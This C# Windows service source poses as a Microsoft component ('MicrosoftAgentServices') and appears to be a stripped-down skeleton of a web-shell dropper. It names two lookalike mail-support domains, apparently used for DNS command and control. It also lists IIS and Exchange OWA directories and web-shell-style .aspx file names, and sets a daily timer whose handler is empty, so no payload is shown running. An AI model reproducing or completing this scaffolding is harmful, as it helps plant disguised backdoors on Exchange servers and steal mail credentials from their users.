using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.ServiceProcess;
using System.Text;
using System.Timers;


namespace MicrosoftAgentServices
{
    public enum enuFileName
    {
        aspnet,
        owafont,
        themes,
        logon

    }
    public partial class Service1 : ServiceBase
    {

        public string dnsdomain = ".eposta.maill-support.com";
        public string dnsdomain2 = ".eposta.mailupdate.info";

        public string web = "i am good boy";
        public string wwwroot = @"c:\inetpub\wwwroot\aspnet_client\";
        public string wwwroot2 = @"c:\inetpub\wwwroot\aspnet_client\system_web\";
        public string webpathexh01 = @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\themes\resources\";
        public string webpathexh02 = @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\themes\";
        public string webpathexh03 = @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\";
        public string[] arrayNames = new string[] { "aspnet.aspx", "owafont.aspx", "themes.aspx", "logon.aspx" };
        public Service1()
        {
            InitializeComponent();
        }


        Timer workerTime = new Timer();
        protected override void OnStart(string[] args)
        {
            workerTime.Elapsed += new ElapsedEventHandler(this.OnElapsedTime);
            workerTime.Interval = 24 * 3600 * 1000;
            workerTime.Enabled = true;
        }
        protected override void OnStop()
        {
            workerTime.Enabled = false;
        }
        private readonly Random _random = new Random();
        public bool istry = true;
        public string randomName = string.Empty;
        private void OnElapsedTime(object value1, ElapsedEventArgs e)
        {
            
        }
        private string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder(size);

            char offset = lowerCase ? 'a' : 'A';
            const int lettersOffset = 26;

            for (int i = 0; i < size; i++)
            {
                char @char = (char)_random.Next(offset, offset + lettersOffset);
                builder.Append(@char);
            }

            return lowerCase ? builder.ToString().ToLower() : builder.ToString();
        }
    }
}
